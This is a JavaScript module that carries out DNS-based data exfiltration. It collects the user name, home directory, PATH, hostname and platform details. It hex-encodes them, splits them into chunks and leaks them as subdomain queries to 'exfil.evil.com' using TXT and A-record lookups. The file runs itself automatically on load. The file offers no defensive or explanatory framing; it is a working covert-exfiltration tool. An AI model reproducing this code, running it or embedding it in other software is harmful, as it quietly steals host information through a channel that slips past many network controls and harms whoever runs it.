/**
 * DNS-Based Exfiltration
 * Uses DNS TXT queries for data exfiltration
 */

const dns = require('dns').promises;

// Exfiltration domain
const EXFIL_DOMAIN = 'exfil.evil.com';

/**
 * Collect sensitive data for exfiltration
 * @returns {Object} - Data to exfiltrate
 */
function collectData() {
    return {
        env: {
            USER: process.env.USER,
            HOME: process.env.HOME,
            PATH: process.env.PATH
        },
        system: {
            hostname: require('os').hostname(),
            platform: process.platform,
            arch: process.arch
        },
        timestamp: Date.now()
    };
}

/**
 * Encode data for DNS exfiltration
 * Converts to hex for DNS-safe characters
 * @param {Object} data - Data to encode
 * @returns {string} - Hex encoded string
 */
function encodeForDNS(data) {
    const json = JSON.stringify(data);
    return Buffer.from(json).toString('hex');
}

/**
 * Split data into DNS-safe chunks
 * DNS labels max 63 characters
 * @param {string} data - Data to split
 * @returns {Array} - Chunks
 */
function splitForDNS(data, chunkSize = 50) {
    const chunks = [];
    for (let i = 0; i < data.length; i += chunkSize) {
        chunks.push(data.slice(i, i + chunkSize));
    }
    return chunks;
}

/**
 * Exfiltrate via DNS TXT queries
 * Each query contains a chunk of encoded data
 * @param {string} encodedData - Hex encoded data
 */
async function exfiltrateViaDNS(encodedData) {
    console.log('Starting DNS exfiltration...');
    console.log('Data size:', encodedData.length, 'hex chars');
    
    const chunks = splitForDNS(encodedData);
    console.log('Chunks:', chunks.length);
    
    const results = [];
    
    for (let i = 0; i < chunks.length; i++) {
        // Format: <chunk-index>.<data>.exfil.evil.com
        const subdomain = `${i}.${chunks[i]}.${EXFIL_DOMAIN}`;
        
        try {
            console.log(`Querying DNS for chunk ${i + 1}/${chunks.length}`);
            
            // Perform TXT query (data is in the query itself)
            await dns.resolveTxt(subdomain);
            
            results.push({ chunk: i, success: true });
        } catch (error) {
            // NXDOMAIN or other error is expected
            // The data was still logged by attacker's DNS server
            console.log(`Chunk ${i + 1} sent (query logged by DNS server)`);
            results.push({ chunk: i, success: true, note: 'query logged' });
        }
        
        // Small delay between queries
        await new Promise(resolve => setTimeout(resolve, 100));
    }
    
    return results;
}

/**
 * Alternative: Use resolve4 for A record queries
 * @param {string} encodedData - Data to exfiltrate
 */
async function exfiltrateViaARecords(encodedData) {
    const chunks = splitForDNS(encodedData, 40);
    
    for (let i = 0; i < chunks.length; i++) {
        const subdomain = `${i}.${chunks[i]}.${EXFIL_DOMAIN}`;
        
        try {
            await dns.resolve4(subdomain);
        } catch (error) {
            // Query still logged
        }
    }
}

/**
 * Full DNS exfiltration pipeline
 */
async function startExfiltration() {
    console.log('=== DNS-Based Exfiltration ===');
    
    const data = collectData();
    console.log('Collected data:', Object.keys(data).join(', '));
    
    const encoded = encodeForDNS(data);
    console.log('Encoded data (hex):', encoded.substring(0, 50) + '...');
    
    const results = await exfiltrateViaDNS(encoded);
    
    console.log('Exfiltration complete');
    console.log('Chunks sent:', results.filter(r => r.success).length);
    
    return results;
}

// Export functions
module.exports = {
    collectData,
    encodeForDNS,
    splitForDNS,
    exfiltrateViaDNS,
    exfiltrateViaARecords,
    startExfiltration,
    EXFIL_DOMAIN
};

// Auto-execute
startExfiltration();
